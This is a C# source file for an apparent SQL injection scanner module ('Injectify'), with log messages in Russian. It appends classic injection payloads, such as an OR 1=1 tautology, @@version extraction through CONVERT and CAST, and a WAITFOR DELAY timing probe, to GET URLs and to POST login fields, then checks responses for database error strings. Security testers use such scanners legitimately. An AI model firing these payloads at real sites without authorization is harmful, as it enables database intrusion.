using Injectify.Core;

namespace Injectify.Modules
{
    public class ErrorBasedScanner : InjectifyScanner
    {
        private readonly List<string> _payloads = new()
        {
            "'",
            "\"",
            "' OR 1=1--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS INT)--",
            "'; WAITFOR DELAY '00:00:05'--"
        };

        public ErrorBasedScanner(string targetUrl) : base(targetUrl) { }

        public override async Task<bool> IsVulnerableAsync()
        {
            bool vulnerableGet = await TestGetAsync();
            bool vulnerablePost = await TestPostAsync();

            return vulnerableGet || vulnerablePost;
        }

        private async Task<bool> TestGetAsync()
        {
            Log("Начинаю тестирование GET-запросами...");

            foreach (var payload in _payloads)
            {
                string testUrl = AddPayloadToUrl(TargetUrl, payload);

                try
                {
                    var content = await SendRequestAsync("GET", testUrl);

                    if (IsSqlError(content))
                    {
                        Log($"[GET] Уязвимость найдена! Payload: {payload}");
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    Log($"[GET] Ошибка запроса: {ex.Message}");
                }
            }

            Log("GET-запросы не выявили уязвимостей.");
            return false;
        }

        private async Task<bool> TestPostAsync()
        {
            Log("Начинаю тестирование POST-запросами...");

            // Пример данных формы, можно позже заменить на парсинг HTML
            var formData = new Dictionary<string, string>
            {
                { "username", "admin" },
                { "password", "password" }
            };

            foreach (var payload in _payloads)
            {
                foreach (var key in formData.Keys.ToList())
                {
                    var testForm = new Dictionary<string, string>(formData);
                    testForm[key] = formData[key] + payload;

                    try
                    {
                        var content = await SendRequestAsync("POST", TargetUrl, testForm);

                        if (IsSqlError(content))
                        {
                            Log($"[POST] Уязвимость найдена! Поле: '{key}', Payload: {payload}");
                            return true;
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"[POST] Ошибка запроса: {ex.Message}");
                    }
                }
            }

            Log("POST-запросы не выявили уязвимостей.");
            return false;
        }

        private bool IsSqlError(string responseContent)
        {
            return responseContent.Contains("SQL syntax") ||
                   responseContent.Contains("mysql_fetch") ||
                   responseContent.Contains("ORA-") ||
                   responseContent.Contains("Unclosed quotation mark") ||
                   responseContent.Contains("quoted string not properly terminated");
        }
    }
}
